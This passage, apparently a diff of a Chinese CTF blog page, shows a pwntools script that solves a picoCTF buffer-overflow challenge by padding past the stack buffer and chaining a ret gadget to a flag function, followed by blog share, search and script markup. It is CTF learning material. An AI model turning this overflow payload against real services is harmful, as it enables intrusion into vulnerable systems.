 <h4 id="脚本-4"><a href="#脚本-4" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># p = process(&#x27;./vuln&#x27;)</span><br><span class="line"># gdb.attach(p, gdbscript=&#x27;b *0x08049370\ncontinue&#x27;)</span><br><span class="line">p = remote(&quot;saturn.picoctf.net&quot;, 50442)</span><br><span class="line"></span><br><span class="line"># 之前找到的 flag 函数地址</span><br><span class="line">flag_address = 0x00401236 </span><br><span class="line"></span><br><span class="line"># 在你的二进制文件中找到一个 ret 小工具的地址</span><br><span class="line"># 假设你找到的是 0x0040101a，请替换为你在 GDB/ROPgadget 中找到的实际地址</span><br><span class="line">ret_gadget_address = 0x0040101a </span><br><span class="line"></span><br><span class="line"># 构建 payload：填充 + ret_gadget_address + flag_address</span><br><span class="line">payload = b&#x27;A&#x27; * (0x40 + 8) + p64(ret_gadget_address) + p64(flag_address)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">print(p.recvall())</span><br></pre></td></tr></table></figure>
@@ -550,8 +712,44 @@
                     </div>
                     <div>
                         
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
                     </div>
                 </div>
+
+                
+                    
+
+<div class="reward-author-container border-box flex-center">
+    <div class="reward-btn border-box flex-center tooltip tooltip-img"
+            data-tooltip-img-url="/images/zfb.jpg"
+            data-tooltip-img-trigger="click"
+            data-tooltip-img-style="top: -6px;"
+    >
+        <i class="/images/tea.svg"></i>&nbsp;请作者喝杯咖啡
+    </div>
+</div>
 
                 
 
@@ -742,6 +940,19 @@
     
 
     
+        <div class="count-info info-item">
+            
+
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
 
     
 </footer>
@@ -844,6 +1055,35 @@
 
     <!-- local search -->
     
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
 
     <!-- tablet toc -->
     
@@ -883,8 +1123,16 @@
 
 <!-- local search -->
 
+    
+<script src="/js/local-search.js"></script>
+
+
 
 <!-- lazyload -->
+
+    
+<script src="/js/lazyload.js"></script>
+
 
 
 <div class="">
@@ -909,6 +1157,10 @@
         
 
         <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
         
     
 
